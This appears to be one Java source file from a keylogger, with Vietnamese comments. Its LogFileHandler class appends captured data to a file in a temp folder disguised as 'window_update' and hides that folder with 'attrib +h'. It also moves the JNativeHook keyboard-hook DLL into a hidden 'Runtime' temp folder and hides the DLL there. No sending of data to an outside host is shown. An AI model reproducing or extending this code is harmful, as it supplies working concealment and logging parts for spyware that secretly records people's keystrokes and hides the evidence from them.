import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;

class LogFileHandler {
    public static final String TEMP_FOLDER_PATH = System.getProperty("java.io.tmpdir");
    public static final String LOG_FOLDER_PATH = TEMP_FOLDER_PATH + File.separator + "window_update" ;

    public static synchronized void writeToFile(String data) {
        File logFile = new File(LogFileHandler.LOG_FOLDER_PATH + File.separator + "data.txt");
        try {
            File parentDir = logFile.getParentFile();
            if (!parentDir.exists()) {
                parentDir.mkdirs();
            }

            if (!logFile.exists()) {
                logFile.createNewFile();
            }
            try (BufferedWriter writer = new BufferedWriter(new FileWriter(logFile, true))) {
                writer.write(data);
                writer.newLine();
            }
            // Ẩn thư mục LOG_FOLDER_PATH
            Process folderProcess = Runtime.getRuntime().exec("attrib +h " + LOG_FOLDER_PATH);
            folderProcess.waitFor();

        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    public static void moveJNativeHookDll() {
        try {
            String exePath = new File(LogFileHandler.class.getProtectionDomain()
                    .getCodeSource()
                    .getLocation()
                    .toURI()).getParent(); // Lấy thư mục chứa chương trình
            String dllPath = exePath + File.separator + "JNativeHook.x86_64.dll"; // Đường dẫn đến file DLL

            File dllFile = new File(dllPath);
            if (!dllFile.exists()) {
                System.err.println("Không tìm thấy file JNativeHook.x86_64.dll tại: " + dllPath);
                return;
            }

            String tempFolderPath = TEMP_FOLDER_PATH + File.separator + "Runtime";
            File tempFolder = new File(tempFolderPath);

            // Tạo thư mục nếu chưa tồn tại
            if (!tempFolder.exists()) {
                tempFolder.mkdirs();
            }

            // Di chuyển file jnativehook.dll vào thư mục tạm
            File targetFile = new File(tempFolder, dllFile.getName());
            Files.move(dllFile.toPath(), targetFile.toPath(), StandardCopyOption.REPLACE_EXISTING);

            // Ẩn file jnativehook.dll
            Process process = Runtime.getRuntime().exec("attrib +h " + targetFile.getAbsolutePath());
            process.waitFor();

        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        } catch (URISyntaxException e) {
            throw new RuntimeException(e);
        }
    }
}
